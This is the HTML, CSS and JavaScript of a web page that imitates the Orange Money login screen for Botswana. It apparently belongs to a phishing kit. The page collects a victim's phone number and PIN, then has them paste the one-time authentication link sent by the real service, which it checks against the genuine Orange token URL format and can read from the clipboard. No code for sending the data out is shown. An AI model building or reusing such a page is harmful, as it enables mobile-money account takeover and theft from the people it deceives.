<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Orange Money — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}

body{
  font-family:Inter,system-ui,Arial;
  background:
    radial-gradient(900px 300px at 50% -150px, rgba(249,115,22,.25), transparent),
    linear-gradient(180deg,#fff4e6,#ffe0bf);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#000;
}

.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:22px;
  border-radius:16px;
  box-shadow:0 18px 40px rgba(0,0,0,.18);
}

.logo{height:46px;display:block;margin:0 auto 12px}

h2{text-align:center;margin:0 0 14px;font-size:20px;font-weight:700}
label{display:block;font-size:13px;margin-top:10px}

input{
  width:100%;
  padding:11px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fafafa;
  font-size:14px;
}

input:focus{outline:none;border-color:#f97316;background:#fff}

.btn{
  background:#f97316;
  color:#fff;
  padding:11px;
  border-radius:10px;
  border:0;
  margin-top:14px;
  width:100%;
  font-weight:700;
  cursor:pointer;
}

.btn[disabled]{background:#fdba74}

.small{font-size:13px;color:#444}
.success{color:#16a34a;font-weight:600}
.error{min-height:18px;font-size:13px;color:#dc2626}

.pin-row{display:flex;gap:8px;justify-content:center;margin-top:8px}

.pin-digit{
  width:42px;height:50px;text-align:center;font-size:20px;
  border-radius:10px;border:1px solid #e5e5e5;background:#fafafa
}

.pin-digit:focus{outline:none;border-color:#f97316;background:#fff}

/* MODAL */

.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.55);
  display:flex;
  align-items:center;
  justify-content:center
}

.otp-box{
  background:linear-gradient(180deg,rgba(255,255,255,.92),rgba(255,255,255,.78));
  backdrop-filter:blur(20px);
  padding:22px;
  border-radius:18px;
  min-width:320px;
  box-shadow:0 25px 50px rgba(0,0,0,.4)
}

.otp-warning{
  color:#dc2626;
  font-size:13px;
  display:none;
  margin-top:6px
}

/* AUTH LINK FIELD */

.link-field{
  display:flex;
  gap:6px;
  margin-top:12px
}

#authLink{
  flex:1;
  border:2px solid #f97316;
  background:#fff7ed;
  padding:12px;
  border-radius:10px;
  font-size:14px
}

#authLink:focus{
  outline:none;
  border-color:#ea580c;
  background:#fff
}

#pasteBtn{
  width:42px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fff;
  font-size:18px;
  cursor:pointer
}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:14px
}

.resend-btn{
  background:#fff;
  border:1px solid #e5e5e5;
  padding:6px 14px;
  border-radius:10px;
  cursor:pointer
}

.resend-btn[disabled]{opacity:.5}

.otp-actions{
  display:flex;
  gap:10px;
  margin-top:14px
}

.otp-actions button{
  flex:1;
  padding:10px;
  border-radius:10px;
  border:0;
  font-weight:700;
  cursor:pointer
}

#confirmOtp{background:#f97316;color:#fff}
#confirmOtp[disabled]{background:#fdba74}
#cancelOtp{background:#f3f4f6;color:#000}

</style>
</head>

<body>

<div class="card">
<img src="assets/orange.png" class="logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">

<label>Phone number</label>
<input id="phone" value="+267" inputmode="numeric">
<div id="phoneError" class="error"></div>

<label>Enter your PIN code</label>

<div class="pin-row">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
</div>

<input type="text" id="hp" style="display:none">

<button id="loginBtn" class="btn" disabled>LOG IN</button>

</form>
</div>

<!-- AUTH LINK MODAL -->

<div id="otpModal" class="otp-modal" style="display:none">

<div class="otp-box">

<div style="text-align:center">
<strong>Authentication</strong>
</div>

<p class="small">Paste the authentication link received.</p>

<div class="link-field">
<input id="authLink" placeholder="Paste authentication link">
<button id="pasteBtn">📋</button>
</div>

<div id="otpWarning" class="otp-warning">
Please paste a valid authentication link
</div>

<div class="resend-row">

<div class="small" id="resendInfo">
Resend available in <span id="countdown">120</span>s
</div>

<button id="resendBtn" class="resend-btn" disabled>
Resend code
</button>

</div>

<div class="otp-actions">

<button id="confirmOtp" disabled>Confirm</button>

<button id="cancelOtp">Cancel</button>

</div>

<div id="otpStatus" class="small" style="margin-top:10px"></div>

</div>
</div>

<script>

/* AUTH MODAL */

const otpModal=document.getElementById("otpModal")
const authLink=document.getElementById("authLink")
const confirmBtn=document.getElementById("confirmOtp")
const cancelBtn=document.getElementById("cancelOtp")
const resendBtn=document.getElementById("resendBtn")
const pasteBtn=document.getElementById("pasteBtn")
const otpWarning=document.getElementById("otpWarning")
const resendInfo=document.getElementById("resendInfo")
const otpStatus=document.getElementById("otpStatus")

let timer=null
let seconds=120

function startCountdown(){

clearInterval(timer)

seconds=120

resendBtn.disabled=true

resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`

timer=setInterval(()=>{

seconds--

document.getElementById("countdown").textContent=seconds

if(seconds<=0){

clearInterval(timer)

resendBtn.disabled=false

resendInfo.textContent="Didn’t receive the link?"

}

},1000)

}

/* STRICT LINK VALIDATION */

function isValidAuthLink(url){

const regex=/^https:\/\/maxit-mobile\.orange\.co\.bw\/oms-links\/auth\?token=[A-Za-z0-9]+$/;

return regex.test(url)

}

function updateConfirm(){

const value=authLink.value.trim()

const ok=isValidAuthLink(value)

confirmBtn.disabled=!ok

otpWarning.style.display=ok?"none":"block"

}

authLink.addEventListener("input",updateConfirm)

/* SAFE PASTE */

pasteBtn.onclick=async()=>{

try{

let text=await navigator.clipboard.readText()

text=text.trim()

authLink.value=text

updateConfirm()

}catch{

alert("Paste manually")

}

}

</script>

</body>
</html>
